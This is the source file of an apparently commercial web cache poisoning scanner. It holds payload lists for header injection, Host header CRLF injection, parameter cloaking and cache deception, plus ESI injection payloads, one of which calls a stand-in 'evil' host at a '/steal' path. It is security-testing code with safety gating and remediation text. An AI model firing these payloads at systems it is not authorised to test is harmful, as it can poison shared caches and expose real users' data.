"""
Web Cache Poisoning Scanner - ENTERPRISE EDITION v2.0

Enterprise-grade web cache poisoning vulnerability scanner with
comprehensive coverage for modern CDNs, reverse proxies, and caching layers.

Features:
- Unkeyed header injection (30+ headers)
- Host header poisoning variants
- Fat GET request poisoning
- Parameter cloaking/pollution
- Web cache deception attacks
- Cache key normalization issues
- CDN-specific attacks (Cloudflare, Fastly, Akamai, CloudFront)
- Response splitting via cache
- Cookie-based cache poisoning
- Path normalization attacks
- Vary header manipulation
- Edge Side Includes (ESI) injection

CDN Detection:
- Cloudflare, Fastly, Akamai, CloudFront, Varnish
- Automatic fingerprinting and CDN-specific payloads

CWE Coverage:
- CWE-444: Inconsistent Interpretation of HTTP Requests
- CWE-525: Use of Web Browser Cache Containing Sensitive Information
- CWE-436: Interpretation Conflict

Author: PetNTester AI Enterprise
Version: 2.0.0-enterprise
"""

from __future__ import annotations

import asyncio
import secrets
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import urljoin, urlparse, quote

import httpx

from scanning.findings import Finding, Severity, VulnType
from scanning.vuln_scanner import ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter
from utils.scan_client import get_scan_client
from scanning.scan_context import ScanContext

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


# ============================================================================
# ENTERPRISE DATA STRUCTURES
# ============================================================================

class CachePoisonType(Enum):
    """Types of cache poisoning attacks."""
    UNKEYED_HEADER = auto()      # Header not in cache key
    HOST_HEADER = auto()         # Host header manipulation
    FAT_GET = auto()             # GET with body
    PARAMETER_CLOAKING = auto()  # Hidden parameters
    CACHE_DECEPTION = auto()     # Static extension trick
    PATH_NORMALIZATION = auto()  # Path confusion
    RESPONSE_SPLITTING = auto()  # CRLF in headers
    COOKIE_BASED = auto()        # Cookie not in cache key
    ESI_INJECTION = auto()       # Edge Side Include
    VARY_MANIPULATION = auto()   # Vary header abuse


class CDNType(Enum):
    """Detected CDN types."""
    CLOUDFLARE = auto()
    FASTLY = auto()
    AKAMAI = auto()
    CLOUDFRONT = auto()
    VARNISH = auto()
    NGINX = auto()
    SQUID = auto()
    UNKNOWN = auto()


@dataclass
class CacheTestResult:
    """Result of a cache poisoning test."""
    vulnerable: bool
    poison_type: Optional[CachePoisonType] = None
    confidence: float = 0.0
    cached: bool = False
    evidence: list[str] = field(default_factory=list)
    canary: str = ""


@dataclass
class CDNInfo:
    """Detected CDN information."""
    cdn_type: CDNType
    version: Optional[str] = None
    cache_headers: list[str] = field(default_factory=list)
    has_cache: bool = False


# ============================================================================
# ENTERPRISE PAYLOAD LIBRARIES
# ============================================================================

# Comprehensive unkeyed headers to test
UNKEYED_HEADERS = [
    # Forwarding headers
    ("X-Forwarded-Host", "HOST_INJECTION"),
    ("X-Forwarded-Scheme", "SCHEME_INJECTION"),
    ("X-Forwarded-Proto", "PROTO_INJECTION"),
    ("X-Forwarded-For", "IP_INJECTION"),
    ("X-Forwarded-Server", "SERVER_INJECTION"),
    ("Forwarded", "FORWARDED_INJECTION"),
    
    # Override headers
    ("X-Original-URL", "URL_OVERRIDE"),
    ("X-Rewrite-URL", "URL_REWRITE"),
    ("X-HTTP-Method-Override", "METHOD_OVERRIDE"),
    ("X-HTTP-Method", "METHOD_INJECTION"),
    ("X-Method-Override", "METHOD_OVERRIDE"),
    
    # Host headers
    ("X-Host", "HOST_INJECTION"),
    ("X-Forwarded-Host", "HOST_INJECTION"),
    ("X-HTTP-Host-Override", "HOST_OVERRIDE"),
    ("X-Original-Host", "HOST_INJECTION"),
    
    # IP headers
    ("X-Real-IP", "IP_INJECTION"),
    ("X-Custom-IP-Authorization", "IP_INJECTION"),
    ("X-Originating-IP", "IP_INJECTION"),
    ("X-Remote-IP", "IP_INJECTION"),
    ("X-Client-IP", "IP_INJECTION"),
    ("X-Remote-Addr", "IP_INJECTION"),
    
    # CDN-specific headers
    ("CF-Connecting-IP", "CLOUDFLARE_IP"),
    ("True-Client-IP", "AKAMAI_IP"),
    ("Fastly-Client-IP", "FASTLY_IP"),
    ("X-Azure-ClientIP", "AZURE_IP"),
    ("X-Cluster-Client-IP", "CLUSTER_IP"),
    ("X-ProxyUser-Ip", "PROXY_IP"),
    
    # Cache control headers
    ("X-Cache-Key", "CACHE_KEY_INJECTION"),
    ("X-Akamai-Cache-Key", "AKAMAI_CACHE"),
    ("Surrogate-Control", "SURROGATE_CONTROL"),
    ("CDN-Cache-Control", "CDN_CACHE"),
    
    # Misc headers
    ("X-Requested-With", "XHR_HEADER"),
    ("X-WAF-Bypass", "WAF_BYPASS"),
    ("X-Debug", "DEBUG_HEADER"),
    ("X-Custom-Header", "CUSTOM_HEADER"),
]

# Host header attack variants
HOST_HEADER_ATTACKS = [
    # Simple replacement
    {"Host": "{evil}"},
    # Port injection
    {"Host": "{original}:{evil}"},
    # Auth-like injection
    {"Host": "{original}@{evil}"},
    # Space injection
    {"Host": "{original} {evil}"},
    # Double Host
    {"Host": "{original}", "Host": "{evil}"},
    # Absolute URL
    {"Host": "{evil}", "X-Forwarded-Host": "{original}"},
    # Tab injection
    {"Host": "{original}\t{evil}"},
    # CRLF injection
    {"Host": "{original}\r\nX-Injected: {evil}"},
]

# Parameter cloaking techniques
PARAMETER_CLOAKING_PAYLOADS = [
    # Analytics parameters (often unkeyed)
    "utm_source={canary}",
    "utm_medium={canary}",
    "utm_campaign={canary}",
    "utm_content={canary}",
    "utm_term={canary}",
    "fbclid={canary}",
    "gclid={canary}",
    "dclid={canary}",
    "_ga={canary}",
    "mc_cid={canary}",
    "mc_eid={canary}",
    
    # Session/tracking (often stripped)
    "session={canary}",
    "sid={canary}",
    "jsessionid={canary}",
    "PHPSESSID={canary}",
    
    # Encoding tricks
    "%00param={canary}",  # Null byte prefix
    "param%00={canary}",  # Null byte in name
    ";param={canary}",    # Semicolon separator
    "&param={canary}&param=normal",  # Duplicate
    "param[]={canary}",   # Array notation
    "param[0]={canary}",  # Array index
    "param.nested={canary}",  # Dot notation
    
    # URL encoding variations
    "%70aram={canary}",   # Encoded 'p'
    "param%3D{canary}",   # Encoded '='
]

# Cache deception paths
CACHE_DECEPTION_PATHS = [
    # Static extension tricks
    "/account/settings/nonexistent.css",
    "/api/user/profile/test.js",
    "/profile/image.png",
    "/settings/style.css",
    "/account.css",
    "/user/data.js",
    "/dashboard.woff",
    "/api/me.ico",
    
    # Path confusion
    "/%2e%2e/static/cached.css",
    "/api/user;.css",
    "/profile%2f..%2fstatic.css",
    "/account%00.css",
    "/settings/.css",
    "/api/data%23.js",
    
    # RPO (Relative Path Overwrite)
    "/account/..%2f..%2fstatic/style.css",
    "/api%2f..%2f..%2fstatic/app.js",
]

# ESI injection payloads
ESI_PAYLOADS = [
    '<esi:include src="http://{evil}/steal"/>',
    '<esi:include src="/admin"/>',
    '<esi:comment text="--><script>alert(1)</script>"/>',
    '<esi:inline name="/attack.html" fetchable="yes">Injected</esi:inline>',
    '<!--esi <include src="{evil}"/>-->',
]

# CDN fingerprints
CDN_FINGERPRINTS = {
    CDNType.CLOUDFLARE: {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
        "values": {"server": "cloudflare"},
    },
    CDNType.FASTLY: {
        "headers": ["x-served-by", "x-cache", "x-timer", "fastly-restarts"],
        "values": {},
    },
    CDNType.AKAMAI: {
        "headers": ["x-akamai-transformed", "x-akamai-session-info"],
        "values": {"server": "akamai"},
    },
    CDNType.CLOUDFRONT: {
        "headers": ["x-amz-cf-id", "x-amz-cf-pop"],
        "values": {"server": "cloudfront"},
    },
    CDNType.VARNISH: {
        "headers": ["x-varnish", "via"],
        "values": {},
    },
}


class CachePoisoningScanner(ScanModule):
    """
    Web Cache Poisoning Scanner - ENTERPRISE EDITION v2.0
    
    Comprehensive cache poisoning testing including:
    - Unkeyed header injection (30+ headers)
    - CDN-specific attack vectors
    - Parameter cloaking techniques
    - Cache deception attacks
    - ESI injection testing
    - Vary header manipulation
    
    CWE Coverage: CWE-444, CWE-525, CWE-436
    """
    
    name = "cache_poisoning_scanner"
    version = "2.0-enterprise"
    
    # Backward compatibility
    UNKEYED_HEADERS = [h[0] for h in UNKEYED_HEADERS]
    CACHE_BUSTERS = [
        "cb={random}",
        "cachebuster={random}",
        "_={random}",
        "nocache={random}",
        "timestamp={random}",
    ]
    
    def __init__(
        self,
        settings: Settings,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        self.cache_wait = 0.5  # Time to wait for cache
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """
        Enterprise: Comprehensive cache poisoning scan.

        SAFETY: Cache poisoning can affect real users by injecting malicious
        content into shared caches. Blocked in passive, safe, and cautious modes.
        """

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._auth_headers = self._ctx.auth_headers

        findings: list[dict[str, Any]] = []

        # ═══════════════════════════════════════════════════════════════════════
        # SAFETY CHECK: Cache poisoning tests can pollute production caches,
        # affecting real users. Host header CRLF injection can inject arbitrary
        # headers. Only allow in aggressive/unrestricted modes.
        # ═══════════════════════════════════════════════════════════════════════
        import os
        safety_mode = os.environ.get("PHANTOM_SAFE_MODE", "safe").lower()
        ALLOWED_MODES = {"aggressive", "unrestricted"}
        if safety_mode not in ALLOWED_MODES:
            logger.info(
                f"Cache Poisoning scanner BLOCKED: safety_mode={safety_mode} "
                f"(requires aggressive or unrestricted). "
                f"Cache poisoning can affect real users via shared caches."
            )
            return {"findings": [], "skipped": True, "reason": f"Blocked by safety mode: {safety_mode}"}

        base_url = f"https://{host}" if not host.startswith("http") else host

        # FIX: Pass auth headers for authenticated endpoint testing
        async with get_scan_client(
            verify_ssl=False,
            timeout=self.timeout,
            custom_headers=self._auth_headers,
        ) as client:
            # Phase 1: Detect caching and CDN
            cdn_info = await self._detect_cdn_enterprise(client, base_url, rate_limiter)
            
            if cdn_info.has_cache:
                findings.append(Finding(
                    vuln_type=VulnType.CACHE_POISONING,
                    name=f"Cache Detected: {cdn_info.cdn_type.name}",
                    severity=Severity.INFO,
                    description=f"Caching layer detected. CDN: {cdn_info.cdn_type.name}. "
                               f"Cache headers: {', '.join(cdn_info.cache_headers)}",
                    host=urlparse(base_url).netloc,
                    endpoint=base_url,
                    evidence=[f"CDN: {cdn_info.cdn_type.name}", *cdn_info.cache_headers],
                    cvss_score=0.0,
                    cwe_id="CWE-444",
                    remediation="Informational - caching detected.",
                    confidence_score=100,
                ).to_dict())
            
            # Phase 2: Test unkeyed headers
            header_findings = await self._test_unkeyed_headers_enterprise(
                client, base_url, cdn_info, rate_limiter
            )
            findings.extend(header_findings)
            
            # Phase 3: Test host header poisoning
            host_findings = await self._test_host_header_enterprise(
                client, base_url, cdn_info, rate_limiter
            )
            findings.extend(host_findings)
            
            # Phase 4: Test parameter cloaking
            cloaking_findings = await self._test_parameter_cloaking_enterprise(
                client, base_url, rate_limiter
            )
            findings.extend(cloaking_findings)
            
            # Phase 5: Test fat GET poisoning
            fat_get_findings = await self._test_fat_get_enterprise(
                client, base_url, rate_limiter
            )
            findings.extend(fat_get_findings)
            
            # Phase 6: Test cache deception
            deception_findings = await self._test_cache_deception_enterprise(
                client, base_url, rate_limiter
            )
            findings.extend(deception_findings)
            
            # Phase 7: Test ESI injection
            esi_findings = await self._test_esi_injection(
                client, base_url, rate_limiter
            )
            findings.extend(esi_findings)
            
            # Phase 8: Test path normalization
            path_findings = await self._test_path_normalization_enterprise(
                client, base_url, rate_limiter
            )
            findings.extend(path_findings)
            
            # Phase 9: Test Vary header manipulation
            vary_findings = await self._test_vary_header_abuse(
                client, base_url, rate_limiter
            )
            findings.extend(vary_findings)
        
        return {"findings": findings}
    
    async def _detect_cdn_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> CDNInfo:
        """
        Enterprise: Detect CDN and caching configuration.
        """
        cdn_info = CDNInfo(cdn_type=CDNType.UNKNOWN, has_cache=False)
        
        await rate_limiter.acquire()
        
        try:
            response = await client.get(base_url)
            headers_lower = {k.lower(): v for k, v in response.headers.items()}
            
            # Detect cache presence
            cache_indicators = [
                "x-cache", "x-cache-hit", "cf-cache-status", "x-varnish",
                "x-drupal-cache", "x-proxy-cache", "x-rack-cache",
                "x-cache-lookup", "age", "x-cdn", "x-served-by",
                "x-cache-hits", "x-timer", "x-edge-location",
            ]
            
            for indicator in cache_indicators:
                if indicator in headers_lower:
                    cdn_info.has_cache = True
                    cdn_info.cache_headers.append(f"{indicator}: {headers_lower[indicator]}")
            
            # Detect specific CDN
            for cdn_type, fingerprint in CDN_FINGERPRINTS.items():
                # Check headers
                for header in fingerprint["headers"]:
                    if header.lower() in headers_lower:
                        cdn_info.cdn_type = cdn_type
                        cdn_info.has_cache = True
                        break
                
                # Check server header
                for key, value in fingerprint["values"].items():
                    if key in headers_lower and value.lower() in headers_lower[key].lower():
                        cdn_info.cdn_type = cdn_type
                        break
                
                if cdn_info.cdn_type != CDNType.UNKNOWN:
                    break
            
            # Additional version detection
            if cdn_info.cdn_type == CDNType.CLOUDFLARE and "cf-ray" in headers_lower:
                cdn_info.version = headers_lower["cf-ray"]
                
        except Exception as e:
            logger.debug(f"CDN detection error: {e}")
        
        return cdn_info
    
    async def _test_unkeyed_headers_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        cdn_info: CDNInfo,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test unkeyed header cache poisoning.
        """
        findings = []
        
        for header_name, header_type in UNKEYED_HEADERS[:20]:  # Test top 20
            canary = f"poisoned-{secrets.token_hex(6)}"
            cache_buster = secrets.token_hex(8)
            
            await rate_limiter.acquire()
            
            try:
                test_url = f"{base_url}?cb={cache_buster}"
                
                # First request with poisoned header
                poison_headers = {header_name: f"{canary}.evil.com"}
                response1 = await client.get(test_url, headers=poison_headers)
                
                # Check if canary is reflected
                if canary in response1.text:
                    # Wait for cache
                    await asyncio.sleep(self.cache_wait)
                    await rate_limiter.acquire()
                    
                    # Second request without poison header
                    response2 = await client.get(test_url)
                    
                    if canary in response2.text:
                        # CONFIRMED: Cache poisoning
                        findings.append(Finding(
                            vuln_type=VulnType.CACHE_POISONING,
                            name=f"Cache Poisoning via {header_name}",
                            severity=Severity.CRITICAL,
                            description=f"Cache poisoning confirmed via unkeyed header '{header_name}'. "
                                       f"The header is reflected but not included in cache key. "
                                       f"Attackers can poison cache for all users.",
                            host=urlparse(base_url).netloc,
                            endpoint=test_url,
                            evidence=[
                                f"Header: {header_name}",
                                f"Type: {header_type}",
                                f"Canary '{canary}' persisted in cached response",
                                "Verified: Second request returned poisoned content",
                            ],
                            cvss_score=9.0,
                            cwe_id="CWE-444",
                            remediation="Include this header in cache key using Vary header, "
                                       "or strip it before caching. "
                                       "Review CDN configuration for unkeyed headers.",
                            confidence_score=90,
                        ).to_dict())
                    else:
                        # Reflected but not cached
                        findings.append(Finding(
                            vuln_type=VulnType.CACHE_POISONING,
                            name=f"Header Reflection: {header_name}",
                            severity=Severity.MEDIUM,
                            description=f"Header '{header_name}' is reflected in response but "
                                       f"not cached. May still be exploitable for XSS.",
                            host=urlparse(base_url).netloc,
                            endpoint=test_url,
                            evidence=[
                                f"Header: {header_name}",
                                "Reflected but not cached",
                            ],
                            cvss_score=5.3,
                            cwe_id="CWE-79",
                            remediation="Sanitize header values before reflection.",
                            confidence_score=80,
                        ).to_dict())
                        
            except Exception as e:
                logger.debug(f"Unkeyed header test error ({header_name}): {e}")
        
        return findings
    
    async def _test_host_header_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        cdn_info: CDNInfo,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test host header cache poisoning variants.
        """
        findings = []
        
        parsed = urlparse(base_url)
        original_host = parsed.netloc
        
        for attack_template in HOST_HEADER_ATTACKS[:6]:
            canary = f"evil-{secrets.token_hex(6)}"
            cache_buster = secrets.token_hex(8)
            test_url = f"{base_url}?cb={cache_buster}"
            
            await rate_limiter.acquire()
            
            try:
                # Build attack headers
                attack_headers = {}
                for key, value in attack_template.items():
                    attack_headers[key] = value.format(
                        original=original_host,
                        evil=f"{canary}.evil.com"
                    )
                
                response1 = await client.get(test_url, headers=attack_headers)
                
                if canary in response1.text:
                    # Verify cache poisoning
                    await asyncio.sleep(self.cache_wait)
                    await rate_limiter.acquire()
                    
                    response2 = await client.get(test_url)
                    
                    if canary in response2.text:
                        findings.append(Finding(
                            vuln_type=VulnType.CACHE_POISONING,
                            name="Host Header Cache Poisoning",
                            severity=Severity.CRITICAL,
                            description="Cache poisoning via Host header manipulation. "
                                       "Attacker-controlled host value persists in cache.",
                            host=original_host,
                            endpoint=test_url,
                            evidence=[
                                f"Attack headers: {attack_headers}",
                                f"Canary '{canary}' cached",
                                "Poisoned response served to clean requests",
                            ],
                            cvss_score=9.0,
                            cwe_id="CWE-444",
                            remediation="Validate Host header strictly. "
                                       "Include Host in cache key. "
                                       "Use absolute URLs in responses.",
                            confidence_score=90,
                        ).to_dict())
                        return findings  # One finding is enough
                        
            except Exception as e:
                logger.debug(f"Host header test error: {e}")
        
        return findings
    
    async def _test_parameter_cloaking_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test parameter cloaking/pollution attacks.
        """
        findings = []
        
        for payload_template in PARAMETER_CLOAKING_PAYLOADS[:15]:
            canary = f"cloak-{secrets.token_hex(6)}"
            cache_buster = secrets.token_hex(8)
            payload = payload_template.format(canary=canary)
            
            await rate_limiter.acquire()
            
            try:
                test_url = f"{base_url}?cb={cache_buster}&{payload}"
                response1 = await client.get(test_url)
                
                if canary in response1.text:
                    # Test if cloaked parameter is excluded from cache key
                    await asyncio.sleep(self.cache_wait)
                    await rate_limiter.acquire()
                    
                    # Request with only cache buster (should be same cache key)
                    clean_url = f"{base_url}?cb={cache_buster}"
                    response2 = await client.get(clean_url)
                    
                    if canary in response2.text:
                        findings.append(Finding(
                            vuln_type=VulnType.CACHE_POISONING,
                            name="Parameter Cloaking Cache Poisoning",
                            severity=Severity.HIGH,
                            description=f"Cache key excludes certain parameters. "
                                       f"Cloaked parameter: {payload_template.split('=')[0]}",
                            host=urlparse(base_url).netloc,
                            endpoint=test_url,
                            evidence=[
                                f"Cloaking payload: {payload}",
                                "Poisoned response served to request without cloaked param",
                            ],
                            cvss_score=7.5,
                            cwe_id="CWE-444",
                            remediation="Include all parameters in cache key. "
                                       "Use consistent parameter parsing.",
                            confidence_score=85,
                        ).to_dict())
                        break
                        
            except Exception as e:
                logger.debug(f"Parameter cloaking test error: {e}")
        
        return findings
    
    async def _test_fat_get_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test fat GET request cache poisoning.
        """
        findings = []
        
        canary = f"fatget-{secrets.token_hex(8)}"
        cache_buster = secrets.token_hex(8)
        test_url = f"{base_url}?cb={cache_buster}"
        
        # Body payloads
        body_payloads = [
            (f"param={canary}", "application/x-www-form-urlencoded"),
            (f'{{"param": "{canary}"}}', "application/json"),
            (f"<param>{canary}</param>", "application/xml"),
        ]
        
        for body, content_type in body_payloads:
            await rate_limiter.acquire()
            
            try:
                response1 = await client.request(
                    "GET",
                    test_url,
                    content=body,
                    headers={"Content-Type": content_type}
                )
                
                if canary in response1.text:
                    # Verify cache
                    await asyncio.sleep(self.cache_wait)
                    await rate_limiter.acquire()
                    
                    response2 = await client.get(test_url)
                    
                    if canary in response2.text:
                        findings.append(Finding(
                            vuln_type=VulnType.CACHE_POISONING,
                            name="Fat GET Cache Poisoning",
                            severity=Severity.HIGH,
                            description="Cache poisoning via GET request with body. "
                                       "Backend processes body, cache ignores it.",
                            host=urlparse(base_url).netloc,
                            endpoint=test_url,
                            evidence=[
                                f"Content-Type: {content_type}",
                                "GET body content cached",
                            ],
                            cvss_score=7.5,
                            cwe_id="CWE-444",
                            remediation="Reject GET requests with body. "
                                       "Include Content-Length in cache key.",
                            confidence_score=85,
                        ).to_dict())
                        return findings
                        
            except Exception as e:
                logger.debug(f"Fat GET test error: {e}")
        
        return findings
    
    async def _test_cache_deception_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test web cache deception attacks.
        """
        findings = []
        
        for path in CACHE_DECEPTION_PATHS[:10]:
            await rate_limiter.acquire()
            
            try:
                test_url = urljoin(base_url, path)
                response = await client.get(test_url)
                
                if response.status_code == 200:
                    # Check for cache indicators
                    cache_indicators = ["x-cache", "cf-cache-status", "x-varnish", "age"]
                    is_cached = any(
                        h in response.headers.keys() 
                        for h in cache_indicators
                    )
                    
                    # Check for sensitive data indicators
                    sensitive_patterns = [
                        "email", "username", "account", "profile", 
                        "password", "token", "session", "api_key",
                        "credit", "ssn", "phone", "address",
                    ]
                    has_sensitive = any(
                        pattern in response.text.lower() 
                        for pattern in sensitive_patterns
                    )
                    
                    if is_cached or has_sensitive:
                        cache_status = "CACHED" if is_cached else "Potentially cacheable"
                        
                        if has_sensitive:
                            findings.append(Finding(
                                vuln_type=VulnType.CACHE_POISONING,
                                name="Web Cache Deception",
                                severity=Severity.HIGH if is_cached else "MEDIUM",
                                description=f"Sensitive data may be cached via static extension trick. "
                                           f"Path: {path}",
                                host=urlparse(base_url).netloc,
                                endpoint=test_url,
                                evidence=[
                                    f"Path: {path}",
                                    f"Status: {cache_status}",
                                    "Response contains sensitive data patterns",
                                ],
                                cvss_score=7.5 if is_cached else 5.3,
                                cwe_id="CWE-525",
                                remediation="Don't cache based on file extension alone. "
                                           "Use Cache-Control: no-store for dynamic content. "
                                           "Validate path normalization.",
                                confidence_score=85 if is_cached else 80,
                            ).to_dict())
                            break
                            
            except Exception as e:
                logger.debug(f"Cache deception test error: {e}")
        
        return findings
    
    async def _test_esi_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test Edge Side Include injection.
        """
        findings = []
        
        cache_buster = secrets.token_hex(8)
        
        # AUDIT-FIX 2026-02-11: Increased from [:3] to [:8] for better ESI coverage
        for esi_payload in ESI_PAYLOADS[:8]:
            canary = secrets.token_hex(6)
            payload = esi_payload.format(evil=f"{canary}.evil.com")
            
            await rate_limiter.acquire()
            
            try:
                # Test via header
                test_url = f"{base_url}?cb={cache_buster}"
                response = await client.get(
                    test_url,
                    headers={"X-ESI-Test": payload}
                )
                
                # FIX 2026-02-18: Separate TRUE indicators from weak/generic ones
                response_lower = response.text.lower()

                # TRUE indicator: Our canary appeared in response = ESI was PROCESSED
                if canary.lower() in response_lower:
                    findings.append(Finding(
                        vuln_type=VulnType.CACHE_POISONING,
                        name="ESI Injection Confirmed",
                        severity=Severity.CRITICAL,
                        description="Edge Side Include injection confirmed. "
                                   "Injected ESI payload was processed by the server.",
                        host=urlparse(base_url).netloc,
                        endpoint=test_url,
                        evidence=[
                            f"Canary '{canary}' found in response",
                            "ESI payload was processed",
                            f"Payload: {payload[:50]}...",
                        ],
                        cvss_score=9.0,
                        cwe_id="CWE-94",
                        remediation="Disable ESI processing or sanitize input strictly. "
                                   "Filter ESI tags from all user input.",
                        confidence_score=95,
                    ).to_dict())
                    return findings

                # WEAK indicators: ESI tags in response (might just be in HTML, not processed)
                # These need to be the EXACT ESI syntax, not generic strings
                weak_esi_patterns = [
                    "<esi:include",   # Full ESI tag pattern
                    "<esi:comment",   # ESI comment tag
                    "<!--esi",        # ESI in HTML comment
                    "<esi:inline",    # ESI inline tag
                ]

                for pattern in weak_esi_patterns:
                    if pattern in response_lower:
                        findings.append(Finding(
                            vuln_type=VulnType.CACHE_POISONING,
                            name="ESI Tags Present (Unverified)",
                            severity=Severity.MEDIUM,  # Downgraded - not confirmed
                            description="ESI tag patterns detected in response. "
                                       "May indicate ESI processing capability, but injection not confirmed.",
                            host=urlparse(base_url).netloc,
                            endpoint=test_url,
                            evidence=[
                                f"ESI pattern found: {pattern}",
                                "Note: Presence of ESI tags does not confirm injection",
                            ],
                            cvss_score=5.0,
                            cwe_id="CWE-94",
                            remediation="Verify if ESI processing is enabled. If so, ensure strict input sanitization.",
                            confidence_score=45,  # LOW - needs manual verification
                        ).to_dict())
                        return findings

                # FIX: REMOVED generic "ESI" and "edge side" - these are NOT evidence!
                # Many pages contain "ESI" without being vulnerable (e.g., "rESIdent", file names)
                        
            except Exception as e:
                logger.debug(f"ESI injection test error: {e}")
        
        return findings
    
    async def _test_path_normalization_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test path normalization cache issues.
        """
        findings = []
        
        canary = secrets.token_hex(8)
        
        # Path normalization test pairs
        normalization_tests = [
            ("/test", "/TEST"),                    # Case sensitivity
            ("/test", "/test/"),                   # Trailing slash
            ("/test", "//test"),                   # Double slash
            ("/test", "/./test"),                  # Dot segment
            ("/test", "/test%20"),                 # Trailing encoded space
            ("/test", f"/{quote('/test')}"),      # Encoded path
        ]
        
        for path1, path2 in normalization_tests:
            cache_buster = secrets.token_hex(8)
            
            await rate_limiter.acquire()
            
            try:
                url1 = urljoin(base_url, f"{path1}?cb={cache_buster}")
                url2 = urljoin(base_url, f"{path2}?cb={cache_buster}")
                
                # First request with unique marker
                response1 = await client.get(url1, headers={"X-Canary": canary})
                
                await asyncio.sleep(self.cache_wait)
                await rate_limiter.acquire()
                
                # Second request to "different" path
                response2 = await client.get(url2)
                
                # Check for normalization inconsistency
                if response1.status_code == 200 and response2.status_code == 200:
                    # Different response lengths suggest different cache entries
                    if abs(len(response1.text) - len(response2.text)) > 100:
                        findings.append(Finding(
                            vuln_type=VulnType.CACHE_POISONING,
                            name="Path Normalization Inconsistency",
                            severity=Severity.MEDIUM,
                            description="Cache key normalization may be inconsistent. "
                                       "Different paths may map to same or different cache entries.",
                            host=urlparse(base_url).netloc,
                            endpoint=url1,
                            evidence=[
                                f"Path 1: {path1}",
                                f"Path 2: {path2}",
                                "Different response sizes for similar paths",
                            ],
                            cvss_score=5.3,
                            cwe_id="CWE-436",
                            remediation="Normalize paths before cache key generation. "
                                       "Use consistent URL handling.",
                            confidence_score=80,
                        ).to_dict())
                        break
                        
            except Exception as e:
                logger.debug(f"Path normalization test error: {e}")
        
        return findings
    
    async def _test_vary_header_abuse(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test Vary header manipulation attacks.
        """
        findings = []
        
        cache_buster = secrets.token_hex(8)
        test_url = f"{base_url}?cb={cache_buster}"
        
        await rate_limiter.acquire()
        
        try:
            # First, get baseline and check Vary header
            response = await client.get(test_url)
            vary_header = response.headers.get("vary", "").lower()
            
            if vary_header:
                # Parse Vary components
                vary_components = [v.strip() for v in vary_header.split(",")]
                
                findings.append(Finding(
                    vuln_type=VulnType.CACHE_POISONING,
                    name="Vary Header Analysis",
                    severity=Severity.INFO,
                    description=f"Vary header present with components: {vary_components}",
                    host=urlparse(base_url).netloc,
                    endpoint=test_url,
                    evidence=[
                        f"Vary: {vary_header}",
                        f"Components: {vary_components}",
                    ],
                    cvss_score=0.0,
                    cwe_id="CWE-444",
                    remediation="Ensure all user-controlled headers are in Vary.",
                    confidence_score=100,
                ).to_dict())
                
                # Test if Vary is respected
                canary = secrets.token_hex(6)
                # AUDIT-FIX 2026-02-11: Increased from [:3] to [:8]
                for component in vary_components[:8]:
                    if component in ["accept-encoding", "accept-language", "*"]:
                        continue
                    
                    await rate_limiter.acquire()
                    
                    # Request with specific Vary component
                    response2 = await client.get(
                        test_url,
                        headers={component: canary}
                    )
                    
                    if canary in response2.text:
                        findings.append(Finding(
                            vuln_type=VulnType.CACHE_POISONING,
                            name=f"Vary Header Reflection: {component}",
                            severity=Severity.MEDIUM,
                            description=f"Vary header component '{component}' is reflected. "
                                       f"May enable targeted cache poisoning.",
                            host=urlparse(base_url).netloc,
                            endpoint=test_url,
                            evidence=[
                                f"Vary component: {component}",
                                "Value reflected in response",
                            ],
                            cvss_score=5.3,
                            cwe_id="CWE-444",
                            remediation="Sanitize header values before reflection.",
                            confidence_score=80,
                        ).to_dict())
                        
        except Exception as e:
            logger.debug(f"Vary header test error: {e}")
        
        return findings
